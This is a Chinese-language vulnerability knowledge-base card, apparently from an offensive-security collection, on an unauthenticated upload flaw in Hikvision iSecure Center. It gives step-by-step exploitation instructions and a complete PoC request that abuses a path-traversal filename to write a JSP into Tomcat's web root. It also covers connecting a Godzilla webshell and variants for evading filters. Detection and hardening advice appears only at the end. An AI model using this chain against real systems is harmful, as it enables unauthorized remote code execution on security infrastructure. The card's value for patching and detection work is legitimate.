---
id: web-java-component-hikvision-isecure-file-upload-path-traversal-rce
title: 海康威视综合安防 iSecure Center 任意文件上传：文件名路径穿越写 JSP GetShell
type: scenario
domain: web
path: web/java/component
technique: hikvision-isecure-file-upload-traversal-rce
tags:
- web
- java
- hikvision
- isecure
- file-upload
- path-traversal
- jsp
- webshell
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V73
  verified_at: '2026-11-05T16:34:18+08:00'
  notes: 已对照原文核对：图02 POST /center/api/files;.png，multipart filename 用 ../ 穿越到 bin/tomcat/apache-tomcat/webapps/clusterMgr/ 写 jsp，Content-Type image/jpeg、响应 code=0 并返回 filename/link；图03-04 哥斯拉连接、图05 网站目录。卡内未认证上传、路径穿越+脚本后缀落 Web 根的要点与指令一致。未验证点：未复跑上传；原文未给产品版本，未设 affected_versions；frontmatter 无 sources/source_url。
url: /docs/web/java/component/web-java-component-hikvision-isecure-file-upload-path-traversal-rce/
draft: false
kb_aliases:
- 海康综合安防任意文件上传
- iSecure Center upload RCE
- /center/api/files 上传
- 文件名路径穿越写 JSP
- 海康安防 GetShell
---

## 一句话结论

海康威视综合安防 iSecure Center 的 `/center/api/files;.png` 上传接口信任 multipart 文件名，攻击者用 `../../../../` 路径穿越把 JSP 文件写入 Tomcat 的 `webapps/clusterMgr/` 目录，响应返回可访问链接，访问或连接该 JSP 即获得 WebShell/RCE。

## 原理

- 上传接口把客户端提供的 `filename` 直接用于拼接保存路径；未对 `../`、路径分隔符与扩展名做清洗，攻击者可穿越到 Web 应用目录。
- 本例目标路径为 `../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/<随机名>.jsp`：从上传目录向上退四级到达 Tomcat 安装目录，再进入 `webapps/clusterMgr/`；该目录由 Tomcat 提供静态/脚本服务，JSP 会被编译执行。
- URL 中的 `;.png` 是矩阵参数，可能用于让前置校验/路由把请求当作图片上传，而后端仍按原始文件名落盘；配合 `Content-Type: image/jpeg` 进一步绕过类型检查。
- 响应 `code=0` 并返回 `data.filename` 与 `link`，其中 `link` 指向 `downloader/center_faq/resource/...` 的可访问路径；攻击者据此定位落盘文件。
- 上传的 JSP 可为 Godzilla/冰蝎等加密 WebShell，连接后在 w3wp/Java 进程权限下执行命令、读写文件；本例用 Godzilla 文件管理与命令执行模块验证。
- 根因是“文件名可控 + 路径穿越未过滤 + 脚本后缀未拦截 + 落盘目录在 Web 根内并可执行”，四点叠加。

## 触发条件

- 目标为海康威视综合安防 iSecure Center，`/center/api/files` 上传接口可访问；
- 接口不需认证或认证可绕过（原文请求未见有效会话）；
- 上传目录到 Tomcat `webapps` 的路径层级与目标部署一致，应用进程对目标目录有写权限；
- Tomcat 解析 `.jsp`，且落盘目录可被 Web 访问。

## 利用步骤

1. 使用 nuclei 或指纹识别确认目标为海康综合安防，并发现 `/center/api/files` 上传接口。
2. 构造 multipart 请求：`filename` 设为 `../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/<随机>.jsp`，`Content-Type` 设为 `image/jpeg`，内容为最小 JSP 或 Godzilla 加密马。
3. 发送到 `/center/api/files;.png`；检查响应 `code=0` 及 `data.filename`/`data.link`，确认文件落盘位置。
4. 访问 `data.link` 或直接请求 `/clusterMgr/<随机>.jsp`，确认 JSP 执行（如返回时间）。
5. 用 Godzilla 等客户端连接该 URL 与密钥，执行命令/文件管理；在授权范围内验证后清理文件。
6. 若路径层级不同，先通过 WebShell 或报错信息确认 Tomcat 安装路径，再调整 `../` 数量。

## PoC

```http
POST /center/api/files;.png HTTP/1.1
Host: target.example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryX

------WebKitFormBoundaryX
Content-Disposition: form-data; name="file"; filename="../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/shell.jsp"
Content-Type: image/jpeg

<%@ page language="java" %><% out.print(new java.util.Date()); %>
------WebKitFormBoundaryX--
```

响应（示意）：

```json
{"code":"0","data":{"filename":"../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/shell.jsp",
"link":"http://target.example.com/downloader/center_faq/resource/<id>/clusterMgr/shell.jsp","id":"<id>"},"msg":""}
```

访问 `.../clusterMgr/shell.jsp` 返回服务器时间，证明 JSP 已执行；原文随后用 Godzilla 连接成功。

## 变体与关联

- 变体：调整 `../` 数量与目标目录（`webapps/ROOT/`、`webapps/center/` 等）；文件名可加随机串避免覆盖。
- 变体：若 JSP 被拦截，尝试 `.jspx`、`.war`、`.xml` 或上传 `web.xml`/`context.xml` 改写部署；也可写入计划任务/启动脚本。
- 关联：[[web-java-component-hikvision-config-decrypt-service-credential-reuse]]（同一系统的后渗透配置解密）、[[web-generic-file-upload-zip-slip-webshell-write]]（路径穿越写 Web 根的另一路径）。
- 边界：上传接口修复为服务端重命名 + 扩展名白名单 + 非 Web 目录存储、或 Tomcat 禁止该目录执行脚本时，链条不成立；路径层级需按实际部署确认。

## 检测与防御

- 检测：`/center/api/files` 请求的 multipart 文件名含 `../`、绝对路径或 `.jsp` 后缀，Content-Type 为图片但内容为脚本；`webapps/clusterMgr/` 等目录出现新增 JSP；Tomcat 日志对新增 JSP 的请求；Godzilla/冰蝎流量特征。
- 防御：服务端用 UUID 重命名，扩展名白名单并校验文件魔数；保存前 `Path.GetFileName`/规范化路径并拒绝 `..`；上传目录放在 Web 根之外。
- 防御：Tomcat 上传目录禁止脚本执行；升级/修补海康综合安防至厂商修复版本，限制上传接口访问来源与认证。
- 加固：WAF 拦截路径穿越与脚本后缀；定期扫描 Web 目录新增脚本文件；对上传接口做鉴权与审计。
